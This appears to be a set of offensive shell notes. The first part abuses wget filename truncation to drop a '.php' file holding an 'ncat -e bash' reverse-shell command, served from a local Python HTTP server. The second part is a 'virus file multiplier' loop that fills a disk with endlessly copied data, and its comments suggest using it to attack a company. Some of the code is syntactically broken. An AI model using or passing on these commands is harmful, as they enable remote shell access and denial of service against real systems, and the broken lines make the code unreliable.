echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080

wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')

 echo "ncat -e ../usr/bin/bash 127.0.0.1 8888" > $(python -c 'print("A"*(236-4)+".php"+".gif")')

 echo "ncat -e ../usr/bin/bash 127.0.0.1 8888" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080



#    virus file multiplier           change here to 100 | if u want to attcack a company

# change here To while True if you are wicked
# or change to 100
 for i in {1..2}; do cat p.txt | >> p.txt; for i in {1..4}; do cat p.txt | >> p.txt; done; done

 while ; do cat p.txt | >> p.txt; for i in {1..20}; do cat p.txt | >> p.txt; done; done

 cat * | > {1..2000}
